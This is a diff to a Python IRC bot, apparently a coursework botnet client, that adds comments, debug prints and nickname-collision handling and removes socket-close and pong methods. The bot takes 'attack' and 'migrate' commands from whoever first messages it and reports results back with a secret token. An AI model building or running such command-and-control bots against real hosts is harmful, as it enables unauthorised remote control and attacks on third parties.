@@ -115,6 +115,8 @@ class Bot:
 
     def check_data(self, data):
         """ Check the data """
+
+        # split data into lines
         data = data.split("\r\n")
 
 
@@ -125,8 +127,15 @@ class Bot:
             if len(line) < 2:
                 continue
 
+            # nickname collision
+            if line[1] == "433":
+                self.NICK_COUNT += 1
+                self.CONNECTED_SERVER = False
+
+                print("Nickname already used")
+
             # check if bot logged onto IRC server
-            elif line[1] == "433":
+            elif line[1] == "462":
                 self.NICK_COUNT += 1
                 self.CONNECTED_SERVER = False
 
@@ -150,6 +159,7 @@ class Bot:
 
                 print("Sent ping")
 
+
     def cmds(self, data):
         """ Listen for commands """
 
@@ -159,14 +169,11 @@ class Bot:
         msg = data[-1]
         sender = data[1].split("!")[0]
 
-        print("DEBUG msg: " + msg)
-        print("DEBUG sender: " + sender)
-
-        # check if controller
+        # set the controller for the first time
         if self.CONTROLLER is None and sender != "edel" + str(self.NICK_COUNT):
-            print("DEBUG senderF: " + sender)
             self.CONTROLLER = sender
 
+        # check if the controller
         if self.CONTROLLER == sender:
 
             # shutdown bot
@@ -181,6 +188,8 @@ class Bot:
 
             msg = msg.split()
 
+            # DEBUG
+            print("DEBUG msg")
             print(msg)
 
             # attack with bot
@@ -203,31 +212,8 @@ class Bot:
                 self.migrate(host, port, chan)
 
             else:
-
+                # controller did not issue a command 
                 return
-
-
-    def close_socket(self, sckt):
-        """ Close a connection """
-
-        print("Socket closed")
-        # remove from outputs
-        if sckt in self.OUTPUTS:
-            self.OUTPUTS.remove(sckt)
-        
-        # remove from inputs
-        self.INPUTS.remove(sckt)
-
-        # close the socket
-        sckt.close()
-
-
-    def pong(self, daemon):
-        """ Send pong """
-
-        # every few seconds
-        threading.Timer(60.0, self.pong).start() 
-        self.send_msg("PONG " + daemon)
 
 
     def handshake(self):
@@ -274,9 +260,9 @@ class Bot:
             attack_socket.connect((host, port))
             
         except Exception as e:            
-            print("Error: Attack failed " + str(e))
+            print("ERROR: Attack failed " + str(e))
 
-            # send to controller
+            # send failure to controller
             msg = "PRIVMSG " + self.CONTROLLER
             msg += " :Attack " + host + " " + str(port) + " failed " + self.SECRET
             msg += "\n"
@@ -284,6 +270,8 @@ class Bot:
             self.send_msg(msg)
 
             return
+
+        print("Attack successful")
 
         # send message
         msg = str(self.ATTACK_COUNT) + " edel" + str(self.NICK_COUNT)
@@ -325,6 +313,7 @@ class Bot:
             return
 
         # success
+        print("Move successful")
 
         # send to controller
         msg = "PRIVMSG " + self.CONTROLLER
@@ -346,6 +335,7 @@ class Bot:
         self.PORT = port
         self.CHANNEL = chan
 
+        # reset variables
         self.BOT_SOCKET = new_socket
 
         self.MESSAGES[self.BOT_SOCKET] = queue.Queue()
@@ -356,9 +346,7 @@ class Bot:
         self.CONNECTED_SERVER = False
         self.JOINED = False
         self.SHUTDOWN = False
-        self.MIGRATE = False
-
-        # reset variables
+        
         # change flag
         self.MIGRATE = True
 
@@ -396,6 +384,7 @@ class Bot:
 
             for socket in readable:
 
+                # receive data from socket
                 socket.settimeout(5)
                 data = socket.recv(1024)
                 socket.settimeout(None)
@@ -430,9 +419,11 @@ class Bot:
                     next_msg = self.MESSAGES[socket].get_nowait()
 
                 except queue.Empty:
+                    # shutdown
                     if self.SHUTDOWN:
                         sys.exit(0)
 
+                    # redo handshake and close socket
                     if self.MIGRATE:
                         self.handshake()
 
